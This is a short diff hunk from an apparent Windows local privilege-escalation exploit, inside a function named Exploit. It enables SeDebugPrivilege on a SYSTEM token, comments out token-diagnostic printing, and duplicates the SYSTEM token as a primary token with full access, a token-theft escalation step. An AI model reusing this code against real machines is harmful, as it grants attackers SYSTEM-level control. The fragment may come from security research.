@@ -393,13 +393,13 @@ int Exploit(void) {
 
 
     LPDWORD TokSession=PrintTokenSessionId(hSystemToken);
-
-    PrintTokenUser(hSystemToken);
+    SetPrivilege(hSystemToken, SE_DEBUG_NAME, true);
+    //PrintTokenUser(hSystemToken);
     PrintTokenPrivilege(hSystemToken);
-    PrintTokenSource(hSystemToken);
-    PrintTokenType(hSystemToken);
-    PrintTokenIsRestricted(hSystemToken);
-    PrintTokenElevation(hSystemToken);
+    //PrintTokenSource(hSystemToken);
+    //PrintTokenType(hSystemToken);
+    //PrintTokenIsRestricted(hSystemToken);
+    //PrintTokenElevation(hSystemToken);
     // make a copy of a token
     DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);
 
